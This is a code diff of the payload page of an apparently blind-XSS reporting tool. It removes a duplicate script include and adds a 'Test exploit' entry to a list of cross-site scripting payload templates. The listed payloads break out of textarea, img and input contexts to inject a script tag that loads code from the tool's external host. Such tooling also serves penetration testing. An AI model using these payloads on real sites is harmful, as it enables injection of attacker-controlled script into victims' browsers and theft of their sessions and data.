@@ -18,7 +18,6 @@
   <script src="http://gs.ccp.li/xssreport/assets/jquery.spin.js"></script>
   <script src="http://gs.ccp.li/xssreport/assets/highlight.7.3.min.js"></script>
   <script src="http://gs.ccp.li/xssreport/assets/uglifyjs.1.2.5.min.js"></script>
-  <script src="http://gs.ccp.li/xssreport/assets/uglifyjs.1.2.5.min.js"></script>
   <script src="http://gs.ccp.li/xssreport/assets/jquery.blockUI.2.54.js"></script>
   <script src="/static/assets/moment.1.7.2.min.js"></script>
   <link href="http://gs.ccp.li/xssreport/assets/highlightjs.default.7.3.min.css" rel="stylesheet">
@@ -181,6 +180,8 @@
       <% url = short_url || "http://xssreport.herokuapp.com/x/" + uri %>
       <h5>Standard non-filtered</h5>
       <pre><code class="html">&lt;script src=&quot;<%- url %>&quot;&gt;&lt;/script&gt;</code></pre>
+      <h5>Test exploit</h5>
+      <pre><code class="html">&lt;/textarea&gt;'&quot;&gt;&lt;script src=<%- url %>&gt;&lt;/script&gt;</code></pre>
       <h5>In url attribute of &lt;img&gt;</h5>
       <pre><code class="html">&quot;&gt;&lt;/img&gt;&lt;script src=&quot;<%- url %>&quot;&gt;&lt;/script&gt;&lt;img d=&quot;</code></pre>
       <h5>In value attribute of &lt;input&gt;</h5>
